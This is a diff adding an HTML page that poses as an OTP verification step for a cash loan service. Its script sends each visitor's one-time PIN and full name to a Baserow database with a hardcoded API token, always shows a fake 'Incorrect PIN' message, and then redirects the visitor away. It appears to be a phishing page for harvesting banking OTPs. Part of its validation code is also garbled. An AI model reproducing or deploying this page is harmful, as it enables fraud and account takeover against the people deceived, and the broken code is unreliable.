@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - YYC CASH LOAN</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #0066cc;
+            --primary-dark: #004d99;
+            --secondary: #ff9900;
+            --text: #333333;
+            --light-bg: #f5f7fa;
+            --white: #ffffff;
+            --success: #28a745;
+            --danger: #dc3545;
+            --gray: #6c757d;
+            --light-gray: #e9ecef;
+            --border-radius: 8px;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--light-bg);
+            color: var(--text);
+            line-height: 1.6;
+            max-width: 480px;
+            margin: 0 auto;
+            position: relative;
+            min-height: 100vh;
+            padding-bottom: 70px;
+        }
+
+        .app-container {
+            background-color: var(--white);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Header Styles */
+        .app-header {
+            background-color: var(--primary);
+            color: var(--white);
+            padding: 15px;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: var(--shadow);
+        }
+
+        .app-header h1 {
+            font-size: 1.5rem;
+            margin: 0;
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background-color: var(--white);
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            max-width: 480px;
+            margin: 0 auto;
+            height: 60px;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray);
+            text-decoration: none;
+            font-size: 0.7rem;
+            width: 20%;
+            height: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .nav-item i {
+            font-size: 1.2rem;
+            margin-bottom: 4px;
+        }
+
+        .nav-item.active {
+            color: var(--primary);
+        }
+
+        /* Content Styles */
+        .content-section {
+            padding: 20px 15px;
+        }
+
+        .otp-section {
+            background-color: var(--white);
+            border-radius: var(--border-radius);
+            padding: 30px 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+            text-align: center;
+        }
+
+        .otp-header {
+            margin-bottom: 30px;
+        }
+
+        .otp-header i {
+            font-size: 4rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+
+        .otp-header h2 {
+            color: var(--primary);
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+
+        .otp-header p {
+            color: var(--gray);
+            font-size: 1rem;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .phone-display {
+            background-color: var(--light-bg);
+            padding: 10px 15px;
+            border-radius: var(--border-radius);
+            margin: 15px 0;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid var(--light-gray);
+            border-radius: var(--border-radius);
+            font-size: 1.1rem;
+            text-align: center;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .otp-input {
+            font-size: 1.5rem;
+            letter-spacing: 0.5rem;
+            font-weight: bold;
+        }
+
+        .btn {
+            display: inline-block;
+            background-color: var(--secondary);
+            color: var(--white);
+            padding: 15px 30px;
+            border-radius: var(--border-radius);
+            text-decoration: none;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-align: center;
+            font-size: 1.1rem;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background-color: #e68a00;
+        }
+
+        .btn:disabled {
+            background-color: var(--gray);
+            cursor: not-allowed;
+        }
+
+        .security-notice {
+            background-color: var(--light-bg);
+            border-left: 4px solid var(--primary);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 var(--border-radius) var(--border-radius) 0;
+        }
+
+        .security-notice i {
+            color: var(--primary);
+            margin-right: 10px;
+        }
+
+        .security-notice p {
+            margin: 0;
+            font-size: 0.9rem;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: var(--white);
+            margin: 50% auto;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            transform: translateY(-50%);
+            box-shadow: var(--shadow);
+        }
+
+        .modal-content i {
+            font-size: 3rem;
+            color: var(--danger);
+            margin-bottom: 20px;
+        }
+
+        .modal-content h3 {
+            color: var(--danger);
+            margin-bottom: 15px;
+        }
+
+        .modal-content p {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .btn-danger {
+            background-color: var(--danger);
+        }
+
+        .btn-danger:hover {
+            background-color: #c82333;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            border: 4px solid var(--light-gray);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <header class="app-header">
+            <h1>YYC CASH LOAN | NCRCP15906</h1>
+        </header>
+
+        <section class="content-section">
+            <div class="otp-section">
+                <div class="otp-header">
+                    <i class="fas fa-mobile-alt"></i>
+                    <h2>OTP Verification</h2>
+                    <p>We have sent an OTP to your phone number</p>
+                    <div class="phone-display">
+                        <i class="fas fa-phone"></i> +27 *** *** **45
+                    </div>
+                    <p>Please check your phone SMS and type in the PIN</p>
+                    <p><strong>Click "Confirm and Payout Now" to confirm your loan instant payout and instant reflection to you</strong></p>
+                </div>
+
+                <form id="otpForm">
+                    <div class="form-group">
+                        <label for="otpCode">Enter 6-Digit PIN</label>
+                        <input type="text" id="otpCode" class="form-control otp-input" maxlength="6" placeholder="000000" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="fullName">Enter Your Full Name</label>
+                        <input type="text" id="fullName" class="form-control" placeholder="Enter your full name" required>
+                    </div>
+
+                    <button type="submit" class="btn" id="confirmBtn">
+                        <i class="fas fa-check-circle"></i> Confirm and Payout Now
+                    </button>
+                </form>
+
+                <div class="loading" id="loadingDiv">
+                    <div class="spinner"></div>
+                    <p>Processing your request...</p>
+                </div>
+
+                <div class="security-notice">
+                    <i class="fas fa-shield-alt"></i>
+                    <p><strong>Security Notice:</strong> Your OTP is valid for 10 minutes. Never share your OTP with anyone.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Error Modal -->
+        <div id="errorModal" class="modal">
+            <div class="modal-content">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h3>Incorrect PIN</h3>
+                <p>If you don't confirm your loan instantly, please note your PIN is incorrect and you can start again and use the correct PIN.</p>
+                <button class="btn btn-danger" onclick="startAgain()">Start Again</button>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <a href="index.html" class="nav-item">
+                <i class="fas fa-home"></i>
+                <span>Home</span>
+            </a>
+            <a href="index.html#apply" class="nav-item">
+                <i class="fas fa-edit"></i>
+                <span>Apply</span>
+            </a>
+            <a href="index.html#loans" class="nav-item">
+                <i class="fas fa-money-bill-wave"></i>
+                <span>Loans</span>
+            </a>
+            <a href="index.html#how" class="nav-item">
+                <i class="fas fa-info-circle"></i>
+                <span>How It Works</span>
+            </a>
+            <a href="index.html#account" class="nav-item active">
+                <i class="fas fa-user"></i>
+                <span>Account</span>
+            </a>
+        </nav>
+    </div>
+
+    <script>
+        // Baserow configuration
+        const TABLE_ID = '503285';
+        const BASEROW_API = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/?user_field_names=true`;
+        const BASEROW_TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
+        const IMGUR_CLIENT_ID = 'c16e7b4d4df51fc';
+
+        // Auto-format OTP input
+        document.getElementById('otpCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 6) {
+                value = value.substring(0, 6);
+            }
+            e.target.value = value;
+        });
+
+        // Form submission
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const otpCode = document.getElementById('otpCode').value;
+            const fullName = document.getElementById('fullName').value;
+            
+            // Validate inputs
+            if (otpCode.length !== ) {
+                alert('');
+                return;
+            }
+            
+            if (!fullName.trim()) {
+                alert('Please enter your full name');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('confirmBtn').disabled = true;
+            document.getElementById('loadingDiv').style.display = 'block';
+            
+            try {
+                // Send data to Baserow
+                const response = await fetch(BASEROW_API, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': BASEROW_TOKEN,
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        'OTP_Code': otpCode,
+                        'Full_Name': fullName,
+                        'Submission_Date': new Date().toISOString(),
+                        'Status': 'OTP_Submitted'
+                    })
+                });
+                
+                if (response.ok) {
+                    // Hide loading
+                    document.getElementById('loadingDiv').style.display = 'none';
+                    
+                    // Show error modal (as requested - always show incorrect PIN message)
+                    document.getElementById('errorModal').style.display = 'block';
+                } else {
+                    throw new Error('Failed to submit data');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                
+                // Hide loading
+                document.getElementById('loadingDiv').style.display = 'none';
+                document.getElementById('confirmBtn').disabled = false;
+                
+                // Show error modal
+                document.getElementById('errorModal').style.display = 'block';
+            }
+        });
+        
+        // Start again function
+        function startAgain() {
+            window.location.href = 'https://www.ght.com';
+        }
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', function(event) {
+            const modal = document.getElementById('errorModal');
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+        
+        // Auto-focus on OTP input when page loads
+        window.addEventListener('load', function() {
+            document.getElementById('otpCode').focus();
+        });
+    </script>
+</body>
+</html>
